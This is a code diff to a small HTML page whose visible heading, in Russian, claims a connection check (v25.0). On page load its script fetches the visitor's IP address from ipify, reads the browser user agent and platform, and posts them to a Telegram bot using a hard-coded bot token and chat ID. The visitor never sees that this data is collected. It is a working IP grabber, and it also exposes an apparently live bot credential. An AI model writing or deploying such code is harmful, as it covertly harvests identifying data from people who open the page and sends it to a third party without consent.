@@ -2,37 +2,47 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Загрузка... (v22.0)</h1>
+    <h1 id="status" style="font-size: 20px; color: blue;">Проверка связи (v25.0)...</h1>
+
     <script>
-        async function run() {
+        async function start() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "-1003861311533"; 
             const status = document.getElementById('status');
 
             try {
-                const ipRes = await fetch('https://api.ipify.org');
+      
+                const ipRes = await fetch('https://api.ipify.org/json/');
                 const ipData = await ipRes.json();
-                const ipv4 = ipData.ip;
 
-                const msg = `👥 ЛОГ В ГРУППЕ!\n📍 IP: ${ipv4}\n📱 Устройство: ${navigator.userAgent}\n💻 Платформа: ${navigator.platform}`;
+                const device = navigator.userAgent;
+                const platform = navigator.platform;
 
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
-                
-                const response = await fetch(url);
-                const result = await response.json();
+                const msg = `👥 ГРУППА OK!\n📍 IP: ${ipData.ip}\n📱 Устройство: ${device}\n💻 Платформа: ${platform}`;
+
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chat_id, text: msg })
+                });
+
+                const result = await res.json();
 
                 if (result.ok) {
-                    status.innerText = "ГОТОВО! Сообщение в группе.";
+                    status.style.color = "green";
+                    status.innerText = "УСПЕХ! Сообщение в группе.";
                 } else {
-                    status.innerText = "Ошибка ТГ: " + result.description;
+                    status.style.color = "red";
+                    status.innerText = "ОШИБКА ТГ: " + result.description;
                 }
+
             } catch (e) {
-                const backupText = encodeURIComponent(`⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`);
-                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backupText}`);
-                status.innerText = "Готово (без IP)!";
+                status.style.color = "red";
+                status.innerText = "ОШИБКА КОДА: " + e;
             }
         }
-        run();
+        start();
     </script>
 </body>
 </html>
